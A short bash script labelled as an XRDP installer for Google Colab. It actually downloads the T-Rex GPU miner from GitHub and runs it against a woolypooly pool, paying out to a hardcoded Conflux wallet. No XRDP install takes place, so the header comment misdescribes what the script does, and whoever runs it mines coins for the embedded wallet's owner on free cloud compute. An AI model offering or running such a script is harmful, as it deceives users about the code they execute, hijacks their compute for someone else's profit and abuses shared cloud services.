#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R nim
 
wget https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz
tar -xf t-rex-0.25.9-linux.tar.gz
./t-rex -a octopus -o pool.sg.woolypooly.com:3094 -u cfx:aar1phfp28tjcxbjfxza7ay5zz05kzhr7emptd3z5n -p x -w x7
